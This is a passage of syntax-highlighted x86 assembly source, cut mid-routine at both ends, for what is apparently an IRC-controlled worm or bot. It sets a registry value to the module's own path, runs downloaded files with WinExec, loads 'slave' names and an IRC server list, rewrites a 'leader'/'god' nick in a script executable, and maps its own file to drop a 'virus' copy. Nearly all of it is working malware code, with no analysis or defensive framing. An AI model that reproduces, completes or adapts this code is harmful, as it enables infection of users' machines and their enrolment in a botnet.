        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">GetSystemDirectory</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">300</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">SetCurrentDirectory</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc13">"NIW\"
</span><span class="sc0">        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">FinishedEditScriptExe</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">GetModuleFileName</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">300</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">RegSetValueEx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">hKey</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RegName</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">REG_SZ</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">


        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">LocalFree</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">RegCloseKey</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">hKey</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc9">INVOKE</span><span class="sc0">  </span><span class="sc5">WSAStartup</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">


        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">DebugFilename</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">CREATE_ALWAYS</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CreateFileA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">DebugFilePtr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">DataFilename</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">GENERIC_READ</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MyOpenFile</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">OpenInternScriptFile</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">DataFilePtr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">GetFileSize</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ScriptFileSize</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">5000</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">LocalAlloc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LMEM_ZEROINIT</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">StrBuffert</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3000</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ScriptInMem</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; esi -&gt; IRC data header</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">ReadFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DataFilePtr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Temp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CloseHandle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DataFilePtr</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ReadScriptFile</span><span class="sc0">

</span><span class="sc5">OpenInternScriptFile</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">s_Header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">s_ScriptSize</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ScriptFileSize</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3000</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">LocalAlloc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LMEM_ZEROINIT</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">StrBuffert</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3000</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ScriptInMem</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">s_ScriptSize</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc5">ReadScriptFile</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">; Magic</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">Magic</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc10">Error</span><span class="sc0">

        </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">; aligment</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">Aligment</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">; pointer to Userinfo</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">MyNick</span><span class="sc0">

     </span><span class="sc5">CopyUserData</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">CopyUserData</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">LocalAlloc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LMEM_ZEROINIT</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">*</span><span class="sc5">NumSlaves</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">Slaves</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">; slave names</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">LoadSlaveData</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">; Ignore names</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">IgnoreNicks</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">



        </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">; IRC server list</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">IRCIpNumbers</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">IRCCurrentIp</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">; Message Handler</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">MessageHandler</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">; Downloaded files ptr</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">DownloadedFiles</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">


   </span><span class="sc5">CheckNextFilename</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MyOpenFile</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">FileDidntExist</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CloseHandle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">lstrcpy</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">lstrlenInc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc5">FileDidntExist</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">lstrlenInc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">NoIncrease</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

     </span><span class="sc5">NoIncrease</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">CheckNextFilename</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc5">ScriptFileSize</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UpdateScriptFile</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">LocalAlloc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LMEM_ZEROINIT</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3000</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">BuffertPtr</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">InBuffertPtr</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">LocalAlloc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LMEM_ZEROINIT</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">TemporaryBuffert</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">DownloadedFiles</span><span class="sc0">

    </span><span class="sc5">RunNextProgram</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">WinExec</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SW_SHOW</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">lstrlen</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">NoMoreFilesToRun</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">RunNextProgram</span><span class="sc0">

    </span><span class="sc5">NoMoreFilesToRun</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">scriptExeName</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">GENERIC_WRITE</span><span class="sc4">+</span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MyOpenFile</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">FinishedEditScriptExe</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">SetFilePointer</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">ReadFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ExeAlign</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Temp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">ExeNamePtr</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">ExeAlign</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">200</span><span class="sc4">+</span><span class="sc2">40</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">Random</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">SetNewLeader</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">                         </span><span class="sc1">; change god instead</span><span class="sc0">
        
     </span><span class="sc5">SetNewLeader</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">SetFilePointer</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">WriteFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MyNick</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Temp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CloseHandle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc5">FinishedEditScriptExe</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">SendVirusName</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">CREATE_ALWAYS</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MyOpenFile</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">DroppedNewVirus</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">FileHandle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">LocalAlloc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LMEM_ZEROINIT</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">300</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">GetModuleFileName</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">300</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CreateFileA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">GENERIC_READ</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OPEN_EXISTING</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc10">Error</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">LocalFree</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CreateFileMappingA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">PAGE_WRITECOPY</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc10">Error</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">MapViewOfFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FILE_MAP_COPY</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc10">Error</span><span class="sc0">

        
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">GetFileSize</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

